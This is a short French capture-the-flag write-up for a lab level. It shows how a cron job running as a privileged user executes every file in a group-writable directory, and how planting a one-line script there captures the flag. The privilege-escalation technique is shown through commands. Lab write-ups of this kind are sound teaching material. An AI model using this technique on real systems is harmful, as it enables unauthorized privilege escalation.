# Level05 — Cron Job + Écriture dans un dossier surveillé

## Reconnaissance

Un script `/usr/sbin/openarenaserver` appartenant à `flag05` exécute tous les fichiers présents dans `/opt/openarenaserver/` puis les supprime :

```sh
for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

Le dossier `/opt/openarenaserver/` est accessible en écriture pour `level05` (`drwxrwxr-x+`).

Un cron déclenche automatiquement ce script en tant que `flag05`.

## Exploitation

Créer un script dans `/opt/openarenaserver/` avec un éditeur :

```sh
nano /opt/openarenaserver/script.sh
```

Contenu du script :

```sh
getflag > /tmp/flag05
```

Attendre l'exécution du cron, puis lire le résultat :

```sh
watch -n 5 cat /tmp/flag05
```

## Token

Voir `../flag`.
